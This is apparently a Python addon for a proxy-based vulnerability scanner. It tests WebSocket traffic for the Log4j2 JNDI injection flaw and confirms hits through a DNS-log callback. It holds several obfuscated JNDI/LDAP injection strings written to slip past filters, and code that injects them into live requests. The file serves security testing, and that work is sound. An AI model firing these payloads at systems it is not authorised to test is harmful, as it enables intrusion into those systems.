#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# @author: orleven

from copy import deepcopy
from mitmproxy.http import HTTPFlow
from lib.core.enums import AddonType
from lib.core.enums import VulType
from lib.core.enums import VulLevel
from addon.agent import AgentAddon
from lib.util.util import random_lowercase_digits
from lib.util.aiohttputil import ClientSession

class Addon(AgentAddon):
    """
    log4j 扫描
    """

    def __init__(self):
        AgentAddon.__init__(self)
        self.name = 'Log4j2DeserializationWS'
        self.addon_type = AddonType.WEBSOCKET_ONCE
        self.vul_name = "Log4j2反序列化漏洞"
        self.level = VulLevel.HIGH
        self.vul_type = VulType.RCE
        self.description = "反序列化漏洞是特殊的任意代码执行漏洞，通常出现在Java环境。漏洞产生原因主要是暴露了反序列化操作API ，导致用户可以操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。在Java编码过程应使用最新版本的组件lib包。特别注意升级，如：Apache Commons Collections、fastjson、Jackson等出现过问题的组件。"
        self.scopen = ""
        self.impact = "1. Log4j2低版本存在反序列化漏洞，导致可以远程命令执行。"
        self.suggestions = "1. 升级Log4j2至最新版本。"
        self.mark = ""
        self.dnslog_domain = '{value}.l42.' + self.dnslog_top_domain
        self.payloads = [
            # "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{dnslog}/test9}",
            # "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{dnslog}/test11}",
            # "${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://{dnslog}/test10}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//{dnslog}/test5}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-r}${env:aaaa:-m}${env:aaaa:-i}${env:aaaa:-:}//{dnslog}/test6}",
            # "${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-d}${env:aaaa:-n}${env:aaaa:-s}${env:aaaa:-:}//{dnslog}/test7}",
            "${a:-${a:-$${a:-${a:-$${j$${a:-}nd${a:-}i:l${a:-}da${a:-}p://{dnslog}/test$${a:-}}}}}}",
            # "${j${a:-}ndi:ld${a:-}ap://{dnslog}/test${a:-}}",
        ]

    async def generate_payload(self, text=None):
        for payload in self.payloads:
            dnslog = self.dnslog_domain.format(value=random_lowercase_digits())
            payload = payload.replace('{dnslog}', dnslog)
            yield payload, dnslog

    async def prove(self, flow: HTTPFlow):
        method = self.get_method(flow)
        url = self.get_url(flow)
        headers = self.get_request_headers(flow)
        message = self.get_websocket_message_by_index(flow, -2)
        message_list = self.get_websocket_messages(flow)[:-2]

        # 扫描message
        if message:
            source_parameter_dic = self.parser_parameter(message.content)
            async for res_function_result in self.generate_parameter_dic_by_function(source_parameter_dic, self.generate_payload):
                temp_parameter_dic = res_function_result[0]
                keyword = res_function_result[1]
                temp_content, temp_boundary = self.generate_content(temp_parameter_dic)
                message.content = temp_content
                if await self.prove_log4j(keyword, method, url, message, headers, message_list):
                    return

    async def prove_log4j(self, keyword, method, url, message, headers, message_list):
        async with ClientSession(self.addon_path) as session:
            async with session.ws_connect(url, method=method, headers=headers, keyword=keyword, message_list=message_list, message=message) as ws:
                if message.is_text:
                    await ws.send_str(str(message.content, 'utf-8'))
                else:
                    await ws.send_bytes(message.content)
                if ws:
                    if await self.get_dnslog_recode(keyword):
                        detail = f"Add from dnslog, Keyword: {keyword}"
                        await self.save_vul(ws, detail)
                        return True
        return False